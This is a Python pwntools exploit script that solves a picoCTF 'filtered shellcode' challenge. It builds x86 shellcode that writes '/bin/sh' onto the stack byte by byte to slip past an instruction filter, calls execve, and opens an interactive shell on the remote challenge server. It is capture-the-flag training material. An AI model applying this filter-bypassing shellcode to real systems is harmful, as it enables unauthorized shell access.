'''
reference:
- https://github.com/Bex32/binary-exploitation/blob/main/filtered_shellcode_writeup.md
- https://www.tutorialspoint.com/assembly_programming/assembly_registers.htm
- https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit
'''
from pwn import *

exe = ELF("./fun")
context.binary = exe
context.terminal = "konsole -e".split()

def gdbdebug(proc: process):
    script = """
    b *0x080485c9
    continue
    step
    x/100x $eax
    """
    gdb.attach(proc, gdbscript=script)

def push(txt):
    '''
    push a text to stack byte by byte using mov and add instruction
    '''
    template = "mov al, %d; add [edi], al; inc edi; nop;"
    instruction = ""
    for i in txt:
        instruction += template % ord(i)
    return instruction

# p = process()
p = remote("mercury.picoctf.net", 28494)
# gdbdebug(p)
shellcode = asm(f"""
                xor eax, eax
                push eax        # make space in the stack to put "/bin/sh"
                push eax
                
                mov edi, esp    # make pointer of esp in  
                
                {push("/bin/sh")}
                
                xor eax, eax
                xor ebx, ebx
                xor ecx, ecx
                xor edx, edx
                
                mov al, 0xb
                mov ebx, esp
                int 0x80
                """)
payload = b""
payload += shellcode
p.sendlineafter(b"Give me code to run:\n", payload)
p.interactive()